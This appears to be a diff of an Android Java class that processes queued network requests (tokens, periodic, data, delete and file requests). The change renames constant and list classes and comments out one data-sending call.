@@ -5,8 +5,8 @@ import java.util.List;
 
 import android.content.Context;
 
-import com.inet.android.list.TurnSendList;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.list.Queue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.DisassemblyParams;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
@@ -63,18 +63,18 @@ public class OperationWithRecordInDataBase {
 			if (req.getType() != -1) {
 				switch (req.getType()) {
 				// ------------------------take token 1---------------------
-				case ConstantValue.TYPE_FIRST_TOKEN_REQUEST:
+				case AppConstants.TYPE_FIRST_TOKEN_REQUEST:
 					Logging.doLog(LOG_TAG, "send token 1", "send token 1");
 					RequestList.sendRequestForFirstToken(mContext);
 					db.delete_byID(req.getID());
 					break;
 				// ------------------------take token 2---------------------
-				case ConstantValue.TYPE_SECOND_TOKEN_REQUEST:
+				case AppConstants.TYPE_SECOND_TOKEN_REQUEST:
 					Logging.doLog(LOG_TAG, "send token 2", "send token 2");
 					RequestList.sendRequestForSecondToken(mContext);
 					db.delete_byID(req.getID());
 					// ------------------------send periodical request----------
-				case ConstantValue.TYPE_PERIODIC_REQUEST:
+				case AppConstants.TYPE_PERIODIC_REQUEST:
 					Logging.doLog(
 							LOG_TAG,
 							"NetworkChangeReceiver send periodical request type =3",
@@ -84,7 +84,7 @@ public class OperationWithRecordInDataBase {
 					break;
 				// ------------------------send data request----------
 
-				case ConstantValue.TYPE_DATA_REQUEST:
+				case AppConstants.TYPE_DATA_REQUEST:
 					if (!typeDataStrings.toString().equals(" "))
 						typeDataStrings.append(",");
 					{
@@ -99,7 +99,7 @@ public class OperationWithRecordInDataBase {
 					}
 					break;
 				// ------------------send del request------------------
-				case ConstantValue.TYPE_DEL_REQUEST:
+				case AppConstants.TYPE_DEL_REQUEST:
 					Logging.doLog(LOG_TAG,
 							"NetworkChangeReceiver send del request type = 5",
 							"NetworkChangeReceiver send del request type = 5");
@@ -109,7 +109,7 @@ public class OperationWithRecordInDataBase {
 					break;
 				// ------------------send file request------------------
 
-				case ConstantValue.TYPE_FILE_REQUEST:
+				case AppConstants.TYPE_FILE_REQUEST:
 					Logging.doLog(LOG_TAG,
 							"NetworkChangeReceiver send file request type = 6"
 									+ " request: " + req.getRequest(),
@@ -133,8 +133,8 @@ public class OperationWithRecordInDataBase {
 			Logging.doLog(LOG_TAG,
 					"before send: " + typeDataStrings.toString(),
 					"before send: " + typeDataStrings.toString());
-			RequestList.sendDataRequest(typeDataStrings.toString(), mContext);
+//			RequestList.sendDataRequest(typeDataStrings.toString(), mContext);
 		}
-		TurnSendList.startGetList(mContext);
+		Queue.getList(mContext);
 	}
 }
